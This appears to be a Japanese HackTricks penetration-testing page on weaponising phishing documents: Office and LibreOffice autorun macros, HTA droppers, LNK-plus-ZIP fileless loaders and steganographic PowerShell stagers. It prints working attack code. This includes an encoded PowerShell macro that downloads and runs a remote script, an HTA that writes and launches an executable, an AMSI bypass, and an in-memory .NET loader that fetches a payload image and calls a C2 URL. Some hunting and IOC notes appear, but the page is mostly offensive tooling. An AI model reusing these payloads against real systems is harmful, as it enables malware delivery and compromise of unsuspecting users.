# Phishing ファイルとドキュメント

{{#include ../../banners/hacktricks-training.md}}

## Office ドキュメント

Microsoft Wordは、ファイルを開く前にファイルデータの検証を行います。データ検証は、OfficeOpenXML標準に対するデータ構造の識別という形で実行されます。データ構造の識別中にエラーが発生した場合、解析対象のファイルは開かれません。

通常、マクロを含むWordファイルは`.docm`拡張子を使用します。しかし、ファイル拡張子を変更してファイル名を変更しても、マクロ実行能力を維持することが可能です。\
例えば、RTFファイルは設計上マクロをサポートしませんが、DOCMファイルをRTFに名前変更するとMicrosoft Wordが処理し、マクロを実行できるようになります。\
同じ内部構造とメカニズムは、Microsoft Office Suite (Excel, PowerPoint etc.) のすべてのソフトウェアに適用されます。

次のコマンドを使用して、いくつかのOfficeプログラムで実行される拡張子を確認できます：
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### 外部画像の読み込み

移動先: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros のバックドア

ドキュメントから任意のコードを実行するために macros を使用することが可能です。

#### Autoload 関数

一般的であればあるほど、AV に検出される可能性が高くなります。

- AutoOpen()
- Document_Open()

#### Macros コード例
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### メタデータを手動で削除

**File > Info > Inspect Document > Inspect Document** に移動すると Document Inspector が表示されます。**Inspect** をクリックし、**Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc 拡張子

作業が終わったら、**Save as type** ドロップダウンでフォーマットを **`.docx`** から **Word 97-2003 `.doc`** に変更してください。\
これは、**can't save macro's inside a `.docx`** と、マクロ対応の **`.docm`** 拡張子に対する **stigma** **around**（例：サムネイルアイコンに大きな `!` が表示され、一部の web/メールゲートウェイで完全にブロックされる）ためです。したがって、この **legacy `.doc` extension is the best compromise**。

#### 悪意のあるマクロ生成ツール

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT 自動実行マクロ (Basic)

LibreOffice Writer ドキュメントは Basic マクロを埋め込み、ファイルを開いたときにマクロを **Open Document** イベントにバインドすることで自動実行できます（Tools → Customize → Events → Open Document → Macro…）。簡単な reverse shell マクロは次のようになります:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Note the doubled quotes (`""`) inside the string – LibreOffice Basic uses them to escape literal quotes, so payloads that end with `...==""")` keep both the inner command and the Shell argument balanced.

配信のヒント:

- ファイルを `.odt` として保存し、マクロをドキュメントイベントにバインドして開いたときに即座に実行されるようにします。
- `swaks` でメール送信する際は `--attach @resume.odt` を使用してください（`@` は添付としてファイル名文字列ではなくファイルのバイトが送信されるように必須です）。検証なしに任意の `RCPT TO` 受信者を受け入れる SMTP サーバを悪用する場合、これは重要です。

## HTA ファイル

HTA は **HTML とスクリプト言語（例えば VBScript や JScript）を組み合わせた** Windows プログラムです。ユーザーインターフェースを生成し、ブラウザのセキュリティモデルの制約を受けない「fully trusted」アプリケーションとして実行されます。

HTA は **`mshta.exe`** によって実行され、これは通常 **Internet Explorer** と共に **インストール** されるため、**`mshta` dependant on IE**。したがって Internet Explorer がアンインストールされている場合、HTA は実行できなくなります。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM認証を強制する

いくつかの方法で**NTLM認証を「リモート」で強制する**ことができます。たとえば、ユーザがアクセスするメールやHTMLに**不可視の画像**を追加する（HTTP MitMでも？）ことや、フォルダを**開くだけで****認証を****トリガー**する**ファイルのアドレス**を被害者に送る、といった手法があります。

**以下のページでこれらのアイデアや他の手法を確認してください：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

ハッシュや認証を盗むだけでなく、**NTLM relay attacks**も実行できることを忘れないでください：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

効果的なキャンペーンでは、二つの正規のデコイ文書（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布します。トリックは、実際の PowerShell ローダーが ZIP の生バイト列内のユニークなマーカー以降に格納されており、.lnk がそれを切り出してメモリ上で完全に実行する点です。

典型的なフロー（.lnk PowerShell one-liner による実装）:

1) Desktop、Downloads、Documents、%TEMP%、%ProgramData%、およびカレントワーキングディレクトリの親ディレクトリなど、一般的なパスから元の ZIP を探す。  
2) ZIP のバイトを読み、ハードコードされたマーカー（例: xFIQCV）を探す。マーカーの後ろにあるすべてが埋め込まれた PowerShell ペイロードである。  
3) ZIP を %ProgramData% にコピーしてそこで展開し、デコイの .docx を開いて正規に見せかける。  
4) 現在のプロセスで AMSI をバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) 次段をデオブフスク（例: すべての # を除去）してメモリ上で実行する。

埋め込まれたステージを切り出して実行するための PowerShell のスケルトン例:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- 配信では、信頼されているPaaSサブドメイン（例: *.herokuapp.com）を悪用することが多く、ペイロードをゲートする（IP/UAに応じて無害なZIPを配布する）場合がある。
- 次段階では、ディスク上の痕跡を最小化するために、base64/XORで暗号化されたshellcodeを復号し、Reflection.Emit + VirtualAlloc経由で実行することが多い。

Persistence used in the same chain
- Microsoft Web BrowserコントロールのCOM TypeLibハイジャックにより、IE/Explorerやそれを埋め込むアプリがペイロードを自動再起動するようにする。詳細と即利用可能なコマンドは以下を参照:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- アーカイブデータの末尾にASCIIマーカー文字列（例: xFIQCV）が追加されたZIPファイル。
- .lnk が親/ユーザフォルダを列挙してZIPを探し、デコイ文書を開く。
- AMSI の改ざん: [System.Management.Automation.AmsiUtils]::amsiInitFailed を利用。
- 長時間稼働する業務スレッドが、信頼されたPaaSドメイン上でホストされたリンクで終わる。

## Steganography-delimited payloads in images (PowerShell stager)

最近のローダーチェーンでは、難読化されたJavaScript/VBSを配布し、それがBase64化されたPowerShellステージャをデコードして実行する。このステージャは画像（多くは GIF）をダウンロードし、固有の開始/終了マーカー間にプレーンテキストとして隠されたBase64エンコードされた .NET DLL を含む。スクリプトはこれらのデリミタ（実際に確認された例: «<<sudo_png>> … <<sudo_odt>>>»）を検索し、間のテキストを抽出してBase64デコードしてバイトに変換し、アセンブリをメモリ上にロードして既知のエントリメソッドを C2 URL とともに呼び出す。

Workflow
- Stage 1: アーカイブされた JS/VBS ドロッパー → 埋め込まれた Base64 をデコード → -nop -w hidden -ep bypass で PowerShell ステージャを起動。
- Stage 2: PowerShell ステージャ → 画像をダウンロードし、マーカ区切りの Base64 を切り出して .NET DLL をメモリ上にロードし、そのメソッド（例: VAI）を C2 URL とオプションを渡して呼び出す。
- Stage 3: ローダーが最終ペイロードを取得し、通常は process hollowing で信頼されたバイナリ（一般的には MSBuild.exe）に注入する。process hollowing と trusted utility proxy execution の詳細は以下を参照:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego ペイロード抽出器およびローダー</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

ノート
- これは ATT&CK T1027.003 (steganography/marker-hiding) です。マーカーはキャンペーンごとに異なります。
- AMSI/ETW bypass と string deobfuscation は、アセンブリをロードする前に一般的に適用されます。
- Hunting: ダウンロードした画像を既知の区切り文字でスキャンする；画像にアクセスして Base64 blobs を即座にデコードする PowerShell を特定する。

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

繰り返し見られる初期段階は、アーカイブ内に配布される、小さく高度に難読化された `.js` または `.vbs` です。その唯一の目的は、埋め込まれた Base64 文字列をデコードし、`-nop -w hidden -ep bypass` を付けて PowerShell を起動し、HTTPS 経由で次段階をブートストラップすることです。

スケルトンロジック（概要）:
- 自身のファイル内容を読み取る
- ジャンク文字列の間にある Base64 blob を見つける
- ASCII PowerShell にデコードする
- `wscript.exe`/`cscript.exe` を使って `powershell.exe` を呼び出して実行する

検出の手掛かり
- コマンドラインに `-enc`/`FromBase64String` を含んで `powershell.exe` を起動するアーカイブされた JS/VBS 添付ファイル
- `wscript.exe` がユーザの一時パスから `powershell.exe -nop -w hidden` を起動している

## Windows files to steal NTLM hashes

以下の **places to steal NTLM creds** のページを確認してください:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
